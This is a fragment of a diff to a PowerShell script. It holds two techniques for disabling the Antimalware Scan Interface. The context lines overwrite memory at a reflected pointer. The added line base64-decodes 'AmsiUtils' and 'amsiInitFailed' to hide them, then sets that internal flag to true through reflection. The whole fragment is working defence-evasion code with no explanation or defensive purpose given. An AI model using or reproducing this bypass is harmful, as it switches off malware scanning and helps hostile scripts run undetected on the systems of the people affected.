@@ -10,3 +10,8 @@ $f.GetValue($null)
 [IntPtr]$ptr=$g
 [Int32[]]$buf=@(0)
 [System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $ptr, 1)
+
+
+
+
+[Ref].Assembly.GetType('System.Management.Automation.'+$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBtAHMAaQBVAHQAaQBsAHMA')))).GetField($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBtAHMAaQBJAG4AaQB0AEYAYQBpAGwAZQBkAA=='))),'NonPublic,Static').SetValue($null,$true)
